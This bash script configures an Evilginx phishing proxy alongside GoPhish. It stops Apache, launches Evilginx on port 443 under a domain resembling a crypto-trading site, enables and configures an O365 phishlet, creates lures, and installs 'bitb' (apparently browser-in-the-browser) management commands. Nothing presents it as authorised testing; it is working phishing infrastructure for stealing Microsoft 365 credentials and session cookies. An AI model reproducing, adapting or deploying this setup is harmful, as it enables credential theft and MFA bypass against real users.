#!/bin/bash

#############################################
# Quick Fix for Evilginx on Running VM
# Run this on the VM to fix Evilginx issues
# Migrates from Apache+Evilginx to Evilginx-only
#############################################

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   Evilginx Fix - Remove Apache, Fix Port 443 Conflict        ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""

DOMAIN="${DOMAIN:-exodustraderai.info}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${YELLOW}Please run as root: sudo bash $0${NC}"
    exit 1
fi

echo -e "${GREEN}[1/7]${NC} Stopping and disabling Apache (port 443 conflict)..."
systemctl stop apache2 2>/dev/null || true
systemctl disable apache2 2>/dev/null || true
killall -9 apache2 2>/dev/null || true
echo "Apache stopped and disabled"

echo -e "${GREEN}[2/7]${NC} Stopping and disabling old Evilginx systemd service..."
systemctl stop evilginx 2>/dev/null || true
systemctl disable evilginx 2>/dev/null || true
rm -f /etc/systemd/system/evilginx.service
systemctl daemon-reload

echo -e "${GREEN}[3/7]${NC} Killing any existing Evilginx screen sessions..."
screen -S evilginx -X quit 2>/dev/null || true
sleep 2

echo -e "${GREEN}[4/7]${NC} Starting Evilginx in screen on port 443..."
screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
sleep 8

echo -e "${GREEN}[5/7]${NC} Configuring Evilginx automatically..."
screen -S evilginx -X stuff "config domain ${DOMAIN}\n"
sleep 2
screen -S evilginx -X stuff "config ipv4 external\n"
sleep 2
screen -S evilginx -X stuff "blacklist noadd\n"
sleep 2
screen -S evilginx -X stuff "phishlets hostname O365 ${DOMAIN}\n"
sleep 2
screen -S evilginx -X stuff "phishlets enable O365\n"
sleep 2
screen -S evilginx -X stuff "lures create O365\n"
sleep 2
screen -S evilginx -X stuff "lures get-url 0\n"
sleep 3

echo -e "${GREEN}[6/7]${NC} Updating management scripts (removing Apache)..."

# Update bitb-start
cat > /usr/local/bin/bitb-start <<'EOSTART'
#!/bin/bash
echo "Starting all services..."
systemctl start gophish

# Start Evilginx in screen if not running
if ! screen -ls | grep -q "\.evilginx\s"; then
    echo "Starting Evilginx in screen..."
    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
else
    echo "Evilginx screen session already running"
fi

echo "All services started"
systemctl status gophish --no-pager
echo ""
echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
EOSTART

# Update bitb-stop
cat > /usr/local/bin/bitb-stop <<'EOSTOP'
#!/bin/bash
echo "Stopping all services..."
systemctl stop gophish

# Kill Evilginx screen session
if screen -ls | grep -q "\.evilginx\s"; then
    echo "Stopping Evilginx screen session..."
    screen -S evilginx -X quit
fi

echo "All services stopped"
EOSTOP

# Update bitb-restart
cat > /usr/local/bin/bitb-restart <<'EORESTART'
#!/bin/bash
echo "Restarting all services..."
systemctl restart gophish

# Restart Evilginx screen session
if screen -ls | grep -q "\.evilginx\s"; then
    echo "Restarting Evilginx..."
    screen -S evilginx -X quit
    sleep 2
fi
screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"

echo "All services restarted"
systemctl status gophish --no-pager
echo ""
echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
EORESTART

# Update bitb-status
cat > /usr/local/bin/bitb-status <<'EOSTATUS'
#!/bin/bash
echo "Service Status:"
echo ""
echo "=== GoPhish ==="
systemctl status gophish --no-pager | head -n 3
echo ""
echo "=== Evilginx ==="
if screen -ls | grep -q "\.evilginx\s"; then
    echo "Status: Running in screen session 'evilginx'"
    echo "To access: sudo screen -r evilginx"
    echo "To detach: Press Ctrl+A then D"
else
    echo "Status: Not running"
    echo "To start: sudo bitb-start"
fi
EOSTATUS

chmod +x /usr/local/bin/bitb-start
chmod +x /usr/local/bin/bitb-stop
chmod +x /usr/local/bin/bitb-restart
chmod +x /usr/local/bin/bitb-status

echo -e "${GREEN}[7/7]${NC} Verifying services..."
sleep 2

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}  Service Status${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

bitb-status

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    FIX COMPLETE!                              ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Changes made:${NC}"
echo "  ✓ Apache stopped and disabled (freed port 443)"
echo "  ✓ Evilginx now running on port 443 directly"
echo "  ✓ Screen session configured and running"
echo "  ✓ Management scripts updated"
echo ""
echo -e "${YELLOW}To access Evilginx console:${NC}"
echo "  sudo screen -r evilginx"
echo ""
echo -e "${YELLOW}To detach from console:${NC}"
echo "  Press Ctrl+A then D"
echo ""
echo -e "${YELLOW}Management commands:${NC}"
echo "  sudo bitb-start    - Start all services"
echo "  sudo bitb-stop     - Stop all services"
echo "  sudo bitb-restart  - Restart all services"
echo "  bitb-status        - Check status"
echo ""
